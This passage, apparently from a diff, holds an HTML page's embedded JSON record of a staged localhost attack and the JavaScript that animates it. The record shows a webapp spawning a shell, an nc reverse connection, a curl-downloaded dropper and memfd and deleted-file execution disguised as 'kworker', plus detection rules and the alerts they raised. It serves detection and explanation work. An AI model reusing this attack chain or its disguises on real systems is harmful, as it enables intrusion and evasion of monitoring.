python3","cmd":"python3 -"},{"id":"file /usr/bin/python3.14","kind":"file","label":"file /usr/bin/python3.14","short":"file /usr/bin/python3.14","cmd":null},{"id":"file /memfd:kworker (deleted)","kind":"file","label":"file /memfd:kworker (deleted)","short":"file /memfd:kworker (deleted)","cmd":null},{"id":"proc 7363 3 [kworker]","kind":"proc","label":"proc 7363 3 (kworker)","short":"proc 7363 3 [kworker]","cmd":"kworker"},{"id":"file /var/tmp/.upd-p15demo","kind":"file","label":"file /var/tmp/.upd-p15demo","short":"file /var/tmp/.upd-p15demo","cmd":null},{"id":"proc 7364 4 [upd]","kind":"proc","label":"proc 7364 4 (upd)","short":"proc 7364 4 [upd]","cmd":"upd"},{"id":"file /var/tmp/p15-demo/webapp.log","kind":"file","label":"file /var/tmp/p15-demo/webapp.log","short":"file /var/tmp/p15-demo/webapp.log","cmd":null}],"why":[{"t":0.0,"src":"proc 7320 python","dst":"proc 7352 sh","op":"CLONE"},{"t":-0.001,"src":"sock 127.0.0.1:8080 -\u003e 127.0.0.1:57084","dst":"proc 7320 python","op":"RECV"},{"t":null,"src":"sock 127.0.0.1:57084 -\u003e 127.0.0.1:8080","dst":"sock 127.0.0.1:8080 -\u003e 127.0.0.1:57084","op":"TCP"},{"t":-0.001,"src":"proc 7351 curl","dst":"sock 127.0.0.1:57084 -\u003e 127.0.0.1:8080","op":"SEND"},{"t":-0.012,"src":"proc 7254 bash","dst":"proc 7351 curl","op":"CLONE"},{"t":-0.078,"src":"file o:2222","dst":"proc 7254 bash","op":"READ"}],"edges":[{"t":0.0,"t_end":null,"src":"proc 7320 python","dst":"proc 7352 sh","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":0.001,"t_end":null,"src":"file /usr/bin/dash","dst":"proc 7352 sh","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":0.004,"t_end":null,"src":"proc 7352 sh","dst":"proc 7353 getent","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":0.006,"t_end":null,"src":"file /usr/bin/getent","dst":"proc 7353 getent","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":0.01,"t_end":null,"src":"proc 7353 getent","dst":"sock 127.0.0.1:40718 -\u003e 127.0.0.53:53","op":"CONNECT","count":1,"bytes":0,"called_as":null},{"t":0.01,"t_end":null,"src":"proc 7353 getent","dst":"sock 127.0.0.1:40718 -\u003e 127.0.0.53:53","op":"SEND","count":1,"bytes":38,"called_as":null},{"t":0.01,"t_end":null,"src":"sock 127.0.0.1:40718 -\u003e 127.0.0.53:53","dst":"proc 7353 getent","op":"RECV","count":1,"bytes":66,"called_as":null},{"t":0.01,"t_end":null,"src":"proc 7353 getent","dst":"file o:2286","op":"WRITE","count":1,"bytes":26,"called_as":null},{"t":0.01,"t_end":null,"src":"file o:2286","dst":"proc 7320 python","op":"READ","count":1,"bytes":26,"called_as":null},{"t":0.011,"t_end":null,"src":"proc 7352 sh","dst":"proc 7354 nc","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":0.011,"t_end":null,"src":"file /usr/bin/nc.openbsd","dst":"proc 7354 nc","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":0.014,"t_end":null,"src":"proc 7354 nc","dst":"sock 127.0.0.1:57868 -\u003e 127.0.0.1:4444","op":"CONNECT","count":1,"bytes":0,"called_as":null},{"t":0.014,"t_end":null,"src":"sock 127.0.0.1:4444 -\u003e 127.0.0.1:57868","dst":"proc 7316 nc","op":"ACCEPT","count":1,"bytes":0,"called_as":null},{"t":1.029,"t_end":null,"src":"proc 7352 sh","dst":"proc 7355 curl","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":1.03,"t_end":null,"src":"file /usr/bin/curl","dst":"proc 7355 curl","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":1.036,"t_end":null,"src":"proc 7355 curl","dst":"sock 127.0.0.1:46508 -\u003e 127.0.0.1:8000","op":"CONNECT","count":1,"bytes":0,"called_as":null},{"t":1.037,"t_end":null,"src":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46508","dst":"proc 7327 python","op":"ACCEPT","count":1,"bytes":0,"called_as":null},{"t":1.038,"t_end":null,"src":"proc 7355 curl","dst":"sock 127.0.0.1:46508 -\u003e 127.0.0.1:8000","op":"SEND","count":1,"bytes":79,"called_as":null},{"t":1.038,"t_end":null,"src":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46508","dst":"proc 7327 python","op":"RECV","count":1,"bytes":79,"called_as":null},{"t":1.043,"t_end":null,"src":"proc 7327 python","dst":"file /var/tmp/p15-demo/stager.log","op":"WRITE","count":2,"bytes":123,"called_as":null},{"t":1.044,"t_end":null,"src":"proc 7327 python","dst":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46508","op":"SEND","count":47,"bytes":11807310,"called_as":null},{"t":1.044,"t_end":null,"src":"sock 127.0.0.1:46508 -\u003e 127.0.0.1:8000","dst":"proc 7355 curl","op":"RECV","count":119,"bytes":11807310,"called_as":null},{"t":1.044,"t_end":null,"src":"file /tmp/.k","dst":"proc 7355 curl","op":"OPEN","count":1,"bytes":0,"called_as":null},{"t":1.044,"t_end":null,"src":"proc 7355 curl","dst":"file /tmp/.k","op":"WRITE","count":1486,"bytes":11807104,"called_as":null},{"t":1.056,"t_end":null,"src":"proc 7352 sh","dst":"proc 7357 chmod","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":1.057,"t_end":null,"src":"file /usr/lib/cargo/bin/coreutils/tee","dst":"proc 7357 chmod","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":1.061,"t_end":null,"src":"proc 7352 sh","dst":"proc 7358 .k","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":1.062,"t_end":null,"src":"file /tmp/.k","dst":"proc 7358 .k","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":1.066,"t_end":null,"src":"proc 7358 .k","dst":"file o:2377","op":"WRITE","count":3,"bytes":32,"called_as":null},{"t":1.066,"t_end":null,"src":"file o:2377","dst":"proc 7320 python","op":"READ","count":11,"bytes":249,"called_as":null},{"t":1.067,"t_end":null,"src":"proc 7352 sh","dst":"proc 7359 curl","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":1.067,"t_end":null,"src":"proc 7352 sh","dst":"proc 7360 sh","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":1.067,"t_end":null,"src":"file /usr/bin/curl","dst":"proc 7359 curl","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":1.068,"t_end":null,"src":"file /usr/bin/dash","dst":"proc 7360 sh","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":1.07,"t_end":null,"src":"file o:2429","dst":"proc 7360 sh","op":"READ","count":1,"bytes":563,"called_as":null},{"t":1.074,"t_end":null,"src":"proc 7359 curl","dst":"sock 127.0.0.1:46512 -\u003e 127.0.0.1:8000","op":"CONNECT","count":1,"bytes":0,"called_as":null},{"t":1.074,"t_end":null,"src":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46512","dst":"proc 7327 python","op":"ACCEPT","count":1,"bytes":0,"called_as":null},{"t":1.074,"t_end":null,"src":"proc 7359 curl","dst":"sock 127.0.0.1:46512 -\u003e 127.0.0.1:8000","op":"SEND","count":1,"bytes":80,"called_as":null},{"t":1.074,"t_end":null,"src":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46512","dst":"proc 7327 python","op":"RECV","count":1,"bytes":80,"called_as":null},{"t":1.075,"t_end":null,"src":"proc 7327 python","dst":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46512","op":"SEND","count":2,"bytes":764,"called_as":null},{"t":1.075,"t_end":null,"src":"sock 127.0.0.1:46512 -\u003e 127.0.0.1:8000","dst":"proc 7359 curl","op":"RECV","count":1,"bytes":764,"called_as":null},{"t":1.075,"t_end":null,"src":"proc 7359 curl","dst":"file o:2429","op":"WRITE","count":1,"bytes":563,"called_as":null},{"t":1.076,"t_end":null,"src":"proc 7360 sh","dst":"file o:2432","op":"WRITE","count":1,"bytes":477,"called_as":null},{"t":1.076,"t_end":null,"src":"proc 7360 sh","dst":"proc 7362 python3","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":1.076,"t_end":null,"src":"file /usr/bin/python3.14","dst":"proc 7362 python3","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":1.09,"t_end":null,"src":"file o:2432","dst":"proc 7362 python3","op":"READ","count":1,"bytes":477,"called_as":null},{"t":1.1,"t_end":null,"src":"file /usr/lib/cargo/bin/coreutils/tee","dst":"proc 7362 python3","op":"OPEN","count":2,"bytes":0,"called_as":null},{"t":1.1,"t_end":null,"src":"file /usr/lib/cargo/bin/coreutils/tee","dst":"proc 7362 python3","op":"READ","count":1,"bytes":11807104,"called_as":null},{"t":1.106,"t_end":null,"src":"proc 7362 python3","dst":"file /memfd:kworker (deleted)","op":"WRITE","count":1,"bytes":11807104,"called_as":null},{"t":1.111,"t_end":null,"src":"proc 7362 python3","dst":"proc 7363 3 [kworker]","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":1.112,"t_end":null,"src":"file /memfd:kworker (deleted)","dst":"proc 7363 3 [kworker]","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":1.115,"t_end":null,"src":"proc 7363 3 [kworker]","dst":"file o:2377","op":"WRITE","count":5,"bytes":107,"called_as":null},{"t":1.116,"t_end":null,"src":"file /var/tmp/.upd-p15demo","dst":"proc 7362 python3","op":"OPEN","count":2,"bytes":0,"called_as":null},{"t":1.121,"t_end":null,"src":"proc 7362 python3","dst":"proc 7364 4 [upd]","op":"CLONE","count":1,"bytes":0,"called_as":null},{"t":1.121,"t_end":null,"src":"file /var/tmp/.upd-p15demo","dst":"proc 7364 4 [upd]","op":"EXECUTE","count":1,"bytes":0,"called_as":null},{"t":1.125,"t_end":null,"src":"proc 7364 4 [upd]","dst":"file o:2377","op":"WRITE","count":5,"bytes":110,"called_as":null},{"t":1.136,"t_end":null,"src":"proc 7320 python","dst":"file /var/tmp/p15-demo/webapp.log","op":"WRITE","count":1,"bytes":265,"called_as":null},{"t":1.136,"t_end":null,"src":"proc 7320 python","dst":"sock 127.0.0.1:8080 -\u003e 127.0.0.1:57084","op":"SEND","count":2,"bytes":144,"called_as":null},{"t":1.137,"t_end":null,"src":"sock 127.0.0.1:57084 -\u003e 127.0.0.1:8080","dst":"proc 7351 curl","op":"RECV","count":1,"bytes":144,"called_as":null}],"pairs":[{"client":"sock 127.0.0.1:57084 -\u003e 127.0.0.1:8080","server":"sock 127.0.0.1:8080 -\u003e 127.0.0.1:57084"},{"client":"sock 127.0.0.1:46508 -\u003e 127.0.0.1:8000","server":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46508"},{"client":"sock 127.0.0.1:46512 -\u003e 127.0.0.1:8000","server":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46512"},{"client":"sock 127.0.0.1:57868 -\u003e 127.0.0.1:4444","server":"sock 127.0.0.1:4444 -\u003e 127.0.0.1:57868"}],"alerts":[{"rule":"R4","name":"net-shell","t":0.001,"detail":"pid 7320 python (network input from 127.0.0.1:8080 \u003c- 127.0.0.1:57084) started /bin/sh as pid 7352","node":"proc 7352 sh","on_path":true,"key":null},{"rule":"R1","name":"dropper","t":1.062,"detail":"wrote /tmp/.k (pid 7355 curl), ran it as pid 7358","node":"proc 7358 .k","on_path":true,"key":null},{"rule":"R1","name":"dropper","t":1.112,"detail":"wrote /memfd:kworker (deleted) (pid 7362 python3), ran it as pid 7363","node":"proc 7363 3 [kworker]","on_path":true,"key":null},{"rule":"R2","name":"memfd-exec","t":1.112,"detail":"pid 7363 ran /proc/self/fd/3 as kworker","node":"proc 7363 3 [kworker]","on_path":true,"key":null},{"rule":"R1","name":"dropper","t":1.121,"detail":"wrote /var/tmp/.upd-p15demo (pid 7362 python3), ran it as pid 7364","node":"proc 7364 4 [upd]","on_path":true,"key":null},{"rule":"R3","name":"deleted-exec","t":1.121,"detail":"pid 7364 ran /proc/self/fd/4 as upd","node":"proc 7364 4 [upd]","on_path":true,"key":null},{"rule":"R4","name":"net-shell","t":null,"detail":"pid 7320 python (network input from 127.0.0.1:8080 \u003c- 127.0.0.1:46328) started /bin/sh as pid 7344","node":null,"on_path":false,"key":"p:7344:1023144936962"}],"source":{"kind":"text","file":"attack-path.txt","sha256":"fd0ee2e51dd5e731914b387134af06948d3f5cd03af13ce53320afc402ebe339","rules":{"file":"rules.txt","sha256":"43a579d577e95f2334e9af1b83e148c180c516e26c76f7ca1d8caf108f9eca69"},"manifest":["commit bc650dd56a64db4d2e41db2bd3f5fd58d15d84ba","tree 5cef5acda63000184912081de2aa5e592d334dff","Linux p15-dev 7.0.0-38-generic #38-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep  4 09:10:14 UTC 2026 x86_64 GNU/Linux","Sat Nov 14 04:09:53 AM UTC 2026"]},"title":"The demo attack, 14 November 2026"}</script>
+<script>
+"use strict";
+(function () {
+const $ = (id) => document.getElementById(id);
+const NS = "http://www.w3.org/2000/svg";
+const RULES = {   // what each rule means: p15.graph.rules' docstring
+  R1: "a file written by one process and executed by another",
+  R2: "code that ran from memory only (a memfd, or an unlinked tmpfs file)",
+  R3: "a program whose file was deleted when it ran",
+  R4: "a shell started by a process that took input from the network",
+};
+const OPCLASS = { CLONE: "ctl", EXECUTE: "ctl", OPEN: "file", READ: "file", WRITE: "file",
+                  SEND: "sock", RECV: "sock", CONNECT: "sock", ACCEPT: "sock", TCP: "pair" };
+const COL_W = 276, NODE_W = 220, NODE_H = 32, ROW_H = 44, LANE_GAP = 40, PIPE_MS = 0.002;
+const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+let S = null;       // the built story
+let step = 0, playing = false, timer = null, follow = true, ghost = false, view = { x: 0, y: 0, k: 1 };
+let auto = true;   // the camera follows the story until the presenter moves it
+
+function el(tag, attrs, parent, svg) {
+  const e = svg ? document.createElementNS(NS, tag) : document.createElement(tag);
+  for (const k in attrs || {}) {
+    if (k === "text") e.textContent = attrs[k]; else e.setAttribute(k, attrs[k]);
+  }
+  if (parent) parent.appendChild(e);
+  return e;
+}
+const sv = (tag, attrs, parent) => el(tag, attrs, parent, true);
+function fmtT(t) {
+  if (t === null || t === undefined) return "";
+  return (t < 0 ? "−" : "+") + Math.abs(t).toFixed(3) + " s";
+}
+function fmtB(b) {
+  if (!b) return "";
+  if (b < 1000) return b + " B";
+  if (b < 1e6) return (b / 1e3).toFixed(1) + " kB";
+  return (b / 1e6).toFixed(1) + " MB";
+}
+function esc(s) {
+  return String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+}
+
+/* ---------- names ---------- */
+function procParts(n) {          // "proc 7363 3 [kworker]" -> {pid, name}
+  const m = /^proc (\d+) (.*)$/.exec(n.short) || [null, "?", n.short];
+  return { pid: m[1], name: m[2] };
+}
+function sockParts(n) {          // "sock 127.0.0.1:46508 -> 127.0.0.1:8000"
+  const m = /^sock (.*):(\d+) -> (.*):(\d+)$/.exec(n.short);
+  return m ? { la: m[1], lp: m[2], ra: m[3], rp: m[4] } : null;
+}
+function name(id) {              // for sentences
+  const n = S.byId[id];
+  if (n.kind === "proc") { const p = procParts(n); return `<b>${esc(p.name)}</b> <span class="mono">(${p.pid})</span>`; }
+  if (n.kind === "file") return `<code>${esc(n.short.slice(5))}</code>`;
+  const s = sockParts(n);
+  return s ? `socket <code>${esc(s.la)}:${s.lp} → ${esc(s.ra)}:${s.rp}</code>` : `<code>${esc(n.short)}</code>`;
+}
+function boxText(n) {            // for the boxes: [bold part, rest]
+  if (n.kind === "proc") { const p = procParts(n); return [p.pid + " ", p.name]; }
+  if (n.kind === "file") return ["", n.short.slice(5)];
+  const s = sockParts(n);
+  if (!s) return ["", n.short.slice(5)];
+  return s.la === s.ra ? ["", `:${s.lp} → :${s.rp}`] : ["", `${s.la}:${s.lp} → ${s.ra}:${s.rp}`];
+}
+function fit(str, max) {         // keep the end of a path, the start of anything else
+  if (str.length <= max) return str;
+  return str.includes("/") ? "…" + str.slice(str.length - max + 1) : str.slice(0, max - 1) + "…";
+}
+function sentence(ev) {
+  const a = name(ev.src), b = name(ev.dst);
+  let s;
+  switch (ev.op) {
+    case "CLONE": s = `${a} forked ${b}`; break;
+    case "EXECUTE": s = `${b} ran ${a}` + (ev.called_as ? ` (${esc(ev.called_as)})` : ""); break;
+    case "OPEN": s = `${b} opened ${a}`; break;
+    case "READ": s = S.byId[ev.src].kind === "file" ? `${b} read ${a}` : `${a} read ${b}`; break;
+    case "WRITE": s = `${a} wrote ${b}`; break;
+    case "SEND": s = `${a} sent on ${b}`; break;
+    case "RECV": s = `${b} received from ${a}`; break;
+    case "CONNECT": s = `${a} connected ${b}`; break;
+    case "ACCEPT": s = `${b} accepted ${a}`; break;
+    case "TCP": s = `${a} and ${b} are the two ends of one TCP connection, joined by sequence number`; break;
+    default: s = `${a} ${esc(ev.op)} ${b}`;
+  }
+  const extra = [];
+  if (ev.count > 1) extra.push(`×${ev.count}`);
+  if (ev.bytes) extra.push(fmtB(ev.bytes));
+  return s + (extra.length ? ` <span class="mono">${extra.join(", ")}</span>` : "");
+}
+
+/* ---------- the story: events, chapters, layout ---------- */
+function build(doc) {
+  if (!doc || doc.schema !== "p15.story/1") throw new Error("this file is not a story document (format p15.story/1)");
+  const byId = {};
+  doc.nodes.forEach((n) => { byId[n.id] = n; });
+  const events = [], links = {}, firstEv = {};
+  const touch = (id, i) => { if (!(id in firstEv)) firstEv[id] = i; };
+  const add = (ev) => {
+    const key = ev.op === "TCP" ? "TCP|" + [ev.src, ev.dst].sort().join("|") : `${ev.src}|${ev.dst}|${ev.op}`;
+    ev.key = key; ev.i = events.length;
+    if (!links[key]) links[key] = { key, src: ev.src, dst: ev.dst, op: ev.op, bytes: 0, first: ev.i };
+    links[key].bytes = Math.max(links[key].bytes, ev.bytes || 0);
+    touch(ev.src, ev.i); touch(ev.dst, ev.i);
+    events.push(ev);
+  };
+  const chapters = [];
+  // 1. the cause chain, oldest cause first
+  const why = doc.why.slice().reverse();
+  if (why.length) {
+    chapters.push({ kind: "why", title: "How it was reached", sub: "the cause chain, oldest first", from: 0 });
+    why.forEach((w) => add({ t: w.t, src: w.src, dst: w.dst, op: w.op, count: 1, bytes: 0, why: true }));
+  }
+  if (!why.length) touch(doc.start, 0);
+  // 2. what it led to, split at the start's own forks
+  const desc = new Set([doc.start]);
+  doc.edges.forEach((e) => { if (e.op === "CLONE" && desc.has(e.src)) desc.add(e.dst); });
+  let tail = doc.edges.length;   // the trailing edges that touch none of the start's subtree
+  while (tail > 0 && !desc.has(doc.edges[tail - 1].src) && !desc.has(doc.edges[tail - 1].dst)) tail--;
+  const cmd = (id) => byId[id].cmd || byId[id].short;
+  let cur = null, lastFork = -1;
+  doc.edges.forEach((e, j) => {
+    const startCh = (title, sub, kind) => {
+      cur = { kind, title, sub, from: events.length, procs: [] };
+      chapters.push(cur);
+    };
+    if (j === 0) startCh("The start", byId[doc.start].short.replace(/^proc /, ""), "start");
+    if (j === tail && tail > 0) startCh("Afterwards", "what followed, outside the start's processes", "after");
+    else if (j < tail && e.op === "CLONE" && e.src === doc.start) {
+      if (cur && cur.kind === "cmd" && lastFork !== null && e.t - lastFork <= PIPE_MS) {
+        cur.procs.push(e.dst);
+      } else {
+        startCh("", "", "cmd"); cur.procs.push(e.dst);
+      }
+      lastFork = e.t;
+    }
+    add({ ...e });
+  });
+  chapters.forEach((c) => { if (c.kind === "cmd") { c.title = c.procs.map(cmd).join(" | "); c.code = true; } });
+  // the TCP pairings: right after both ends are on the page, unless the cause chain told one already
+  const pairsIn = new Set(events.filter((e) => e.op === "TCP").map((e) => e.key));
+  const pend = doc.pairs.filter((p) => !pairsIn.has("TCP|" + [p.client, p.server].sort().join("|")));
+  if (pend.length) {
+    // insert each pairing after the event where its second end appears; rebuild indices after
+    const ins = pend.map((p) => ({ p, at: Math.max(firstEv[p.client], firstEv[p.server]) })).sort((a, b) => a.at - b.at);
+    const out = [];
+    let k = 0;
+    const chFrom = chapters.map((c) => c.from), newFrom = chFrom.slice();
+    events.forEach((ev, i) => {
+      out.push(ev);
+      while (k < ins.length && ins[k].at === i) {
+        out.push({ t: null, src: ins[k].p.client, dst: ins[k].p.server, op: "TCP", count: 1, bytes: 0, pair: true });
+        chFrom.forEach((f, c) => { if (f > i) newFrom[c]++; });
+        k++;
+      }
+    });
+    chapters.forEach((c, i) => { c.from = newFrom[i]; });
+    events.length = 0;
+    for (const key in links) delete links[key];
+    for (const key in firstEv) delete firstEv[key];
+    out.forEach((ev) => add(ev));
+  }
+  chapters.forEach((c, i) => { c.to = i + 1 < chapters.length ? chapters[i + 1].from - 1 : events.length - 1; });
+  for (let i = chapters.length - 1; i >= 0; i--) if (chapters[i].to < chapters[i].from) chapters.splice(i, 1);   // a chapter left empty
+  const chapterOf = (i) => { let c = 0; while (c + 1 < chapters.length && chapters[c + 1].from <= i) c++; return c; };
+  // a pairing's time is the event's before it
+  events.forEach((ev, i) => { if (ev.t === null && ev.pair && i > 0) ev.tShown = events[i - 1].t; });
+  // alerts: told at the EXECUTE into their node, else when the node appears
+  const alerts = doc.alerts.filter((a) => a.on_path).map((a) => {
+    const ex = events.find((ev) => ev.op === "EXECUTE" && ev.dst === a.node);
+    return { ...a, at: ex ? ex.i : firstEv[a.node] };
+  });
+  // programs: files whose only edges are EXECUTE out of them
+  const roles = {};
+  events.forEach((ev) => {
+    (roles[ev.src] = roles[ev.src] || new Set()).add(ev.op === "EXECUTE" ? "exe" : "other");
+    (roles[ev.dst] = roles[ev.dst] || new Set()).add("other");
+  });
+  // layout: a column per chapter that brings new nodes, lanes by kind
+  const colOf = {}, colsUsed = [];
+  const nodesByCh = chapters.map(() => []);
+  Object.keys(firstEv).sort((a, b) => firstEv[a] - firstEv[b]).forEach((id) => nodesByCh[chapterOf(firstEv[id])].push(id));
+  nodesByCh.forEach((ids, c) => { if (ids.length) { colsUsed.push(c); } });
+  const colIndex = {};
+  colsUsed.forEach((c, i) => { colIndex[c] = i; chapters[c].col = i; });
+  let maxProc = 1;
+  const pos = {};
+  nodesByCh.forEach((ids, c) => {
+    if (!ids.length) return;
+    const n = { proc: 0, file: 0, sock: 0 };
+    ids.forEach((id) => { colOf[id] = colIndex[c]; pos[id] = { lane: byId[id].kind, row: n[byId[id].kind]++ }; });
+    maxProc = Math.max(maxProc, n.proc);
+  });
+  let maxSock = 0, maxFile = 0;
+  Object.values(pos).forEach((p) => { if (p.lane === "sock") maxSock = Math.max(maxSock, p.row + 1); if (p.lane === "file") maxFile = Math.max(maxFile, p.row + 1); });
+  const fileTop = maxProc * ROW_H + LANE_GAP;
+  for (const id in pos) {
+    const p = pos[id], x = colOf[id] * COL_W;
+    const y = p.lane === "proc" ? p.row * ROW_H : p.lane === "sock" ? -LANE_GAP - (p.row + 1) * ROW_H + (ROW_H - NODE_H) : fileTop + p.row * ROW_H;
+    pos[id] = { x, y, col: colOf[id] };
+  }
+  const lanes = {
+    sock: [-LANE_GAP - maxSock * ROW_H + (ROW_H - NODE_H) - 10, -LANE_GAP + (ROW_H - NODE_H) + 10 - (ROW_H - NODE_H)],
+    proc: [-10, maxProc * ROW_H - (ROW_H - NODE_H) + 10],
+    file: [fileTop - 10, fileTop + maxFile * ROW_H - (ROW_H - NODE_H) + 10],
+  };
+  const t0 = events.reduce((m, e) => (e.t !== null && e.t < m ? e.t : m), Infinity);
+  const t1 = events.reduce((m, e) => (e.t !== null && e.t > m ? e.t : m), -Infinity);
+  return { doc, byId, events, links, firstEv, chapters, chapterOf, alerts, roles, pos, lanes, cols: colsUsed.length,
+           nodesByCh, t0, t1 };
+}
+
+/* ---------- drawing ---------- */
+let G = {};
+function draw() {
+  const defs = $("defs"), lanesG = $("g-lanes"), linksG = $("g-links"), hitsG = $("g-hits"), nodesG = $("g-nodes");
+  [defs, lanesG, linksG, hitsG, nodesG].forEach((g) => { g.textContent = ""; });
+  ["ctl", "file", "sock", "hot"].forEach((c) => {
+    const m = sv("marker", { id: "m-" + c, viewBox: "0 0 10 10", refX: "9", refY: "5", markerWidth: "7", markerHeight: "7",
+                             orient: "auto-start-reverse", markerUnits: "userSpaceOnUse" }, defs);
+    sv("path", { d: "M0,1 L10,5 L0,9 z", class: "m-" + c }, m);
+  });
+  const W = Math.max(1, S.cols) * COL_W - (COL_W - NODE_W);
+  // lanes
+  const lx = -150;
+  [["sock", "network"], ["proc", "processes"], ["file", "files"]].forEach(([k, label]) => {
+    const [a, b] = S.lanes[k];
+    if (b - a < 24) return;
+    sv("rect", { x: lx, y: a, width: W - lx + 30, height: b - a, rx: 8, class: "lane-bg" }, lanesG);
+    sv("text", { x: lx + 14, y: a + 20, class: "lane-name", text: label }, lanesG);
+  });
+  // column heads
+  const top = Math.min(S.lanes.sock[0], S.lanes.proc[0]) - 16;
+  S.chapters.forEach((c, i) => {
+    if (c.col === undefined) return;
+    const x = c.col * COL_W;
+    const t = sv("text", { x, y: top - 8, class: "col-head" }, lanesG);
+    sv("tspan", { class: "n", text: String(i + 1) + "  " }, t);
+    sv("tspan", { text: fit(c.title || c.sub, 30) }, t);
+    if (c.col > 0) sv("line", { x1: x - (COL_W - NODE_W) / 2, x2: x - (COL_W - NODE_W) / 2, y1: top + 4, y2: S.lanes.file[1], class: "col-rule" }, lanesG);
+  });
+  G.bounds = { x: lx, y: top - 30, w: W - lx + 40, h: S.lanes.file[1] - top + 40 };
+  // links
+  G.links = {}; G.hits = {};
+  Object.values(S.links).forEach((L) => {
+    const cls = OPCLASS[L.op] || "ctl";
+    const w = cls === "pair" ? 2 : 1.4 + Math.min(4, Math.log10((L.bytes || 0) + 1) * 0.55);
+    const p = sv("path", { d: route(L), class: `link c-${cls}`, "stroke-width": w.toFixed(2) }, linksG);
+    if (cls !== "pair") p.setAttribute("marker-end", `url(#m-${cls})`);
+    G.links[L.key] = p;
+    const h = sv("path", { d: p.getAttribute("d"), class: "hit off" }, hitsG);
+    sv("title", { text: `${L.op}: ${S.byId[L.src].short} → ${S.byId[L.dst].short}` }, h);
+    h.addEventListener("click", (ev) => { ev.stopPropagation(); seek(L.first); });
+    G.hits[L.key] = h;
+  });
+  // nodes
+  G.nodes = {};
+  const alertsOn = {};
+  S.alerts.forEach((a) => { (alertsOn[a.node] = alertsOn[a.node] || []).push(a.rule); });
+  Object.keys(S.pos).forEach((id) => {
+    const n = S.byId[id], p = S.pos[id];
+    const prog = n.kind === "file" && S.roles[id] && !S.roles[id].has("other");
+    const g = sv("g", { class: `node k-${n.kind}` + (prog ? " prog" : "") + (id === S.doc.start ? " start" : ""),
+                       transform: `translate(${p.x},${p.y})`, tabindex: "-1" }, nodesG);
+    const box = sv("g", { class: "box" }, g);
+    sv("rect", { class: "ring", x: -4, y: -4, width: NODE_W + 8, height: NODE_H + 8, rx: n.kind === "sock" ? 20 : 9 }, box);
+    sv("rect", { class: "b", width: NODE_W, height: NODE_H, rx: n.kind === "sock" ? 16 : n.kind === "proc" ? 6 : 2 }, box);
+    const [bold, rest] = boxText(n);
+    const tags = (alertsOn[id] || []).filter((r, i, a) => a.indexOf(r) === i);
+    const room = Math.floor((NODE_W - 20 - tags.length * 26) / 7.25);
+    const t = sv("text", { x: 10, y: NODE_H / 2 + 4 }, box);
+    if (bold) sv("tspan", { class: "pid", text: bold }, t);
+    sv("tspan", { text: fit(rest, Math.max(6, room - bold.length)) }, t);
+    sv("title", { text: n.label }, g);
+    tags.forEach((r, i) => {
+      const tg = sv("g", { class: "tag", transform: `translate(${NODE_W - 10 - (tags.length - i) * 26 + 2},${(NODE_H - 16) / 2})` }, box);
+      sv("rect", { width: 24, height: 16, rx: 3 }, tg);
+      sv("text", { x: 12, y: 11.5, "text-anchor": "middle", text: r }, tg);
+    });
+    g.addEventListener("click", (ev) => { ev.stopPropagation(); showNode(id); });
+    G.nodes[id] = g;
+  });
+  // the path lengths, for the drawing animation
+  requestAnimationFrame(() => {
+    for (const k in G.links) { try { G.links[k].style.setProperty("--len", G.links[k].getTotalLength().toFixed(1)); } catch (e) { /* not rendered yet */ } }
+  });
+}
+function anchor(id, side) {
+  const p = S.pos[id];
+  return { x: p.x + (side === "r" ? NODE_W : side === "l" ? 0 : NODE_W / 2), y: p.y + NODE_H / 2 };
+}
+function route(L) {
+  const a = S.pos[L.src], b = S.pos[L.dst];
+  if (a.col < b.col) {
+    const s = anchor(L.src, "r"), e = anchor(L.dst, "l"), dx = Math.max(40, (e.x - s.x) / 2);
+    return `M${s.x},${s.y} C${s.x + dx},${s.y} ${e.x - dx},${e.y} ${e.x - 2},${e.y}`;
+  }
+  if (a.col > b.col) {        // back to an earlier column: over the top of the boxes between
+    const s = anchor(L.src, "l"), e = anchor(L.dst, "r"), dx = 70;
+    return `M${s.x},${s.y} C${s.x - dx},${s.y} ${e.x + dx},${e.y} ${e.x + 2},${e.y}`;
+  }
+  const s = anchor(L.src, "r"), e = anchor(L.dst, "r"), bulge = 34 + Math.abs(e.y - s.y) * 0.18;
+  return `M${s.x},${s.y} C${s.x + bulge},${s.y} ${e.x + bulge},${e.y} ${e.x + 2},${e.y}`;
+}
+
+/* ---------- the camera ---------- */
+function applyView(instant) {
+  const w = $("world");
+  w.classList.toggle("nomove", !!instant || reduced);
+  w.style.transform = `translate(${view.x}px,${view.y}px) scale(${view.k})`;
+}
+function fitBox(b, maxK, instant) {
+  const r = $("stage").getBoundingClientRect();
+  const capH = $("caption").offsetHeight + 24;
+  const pad = 40, H = Math.max(120, r.height - capH - 50);
+  const k = Math.min((r.width - pad * 2) / b.w, (H - pad) / b.h, maxK);
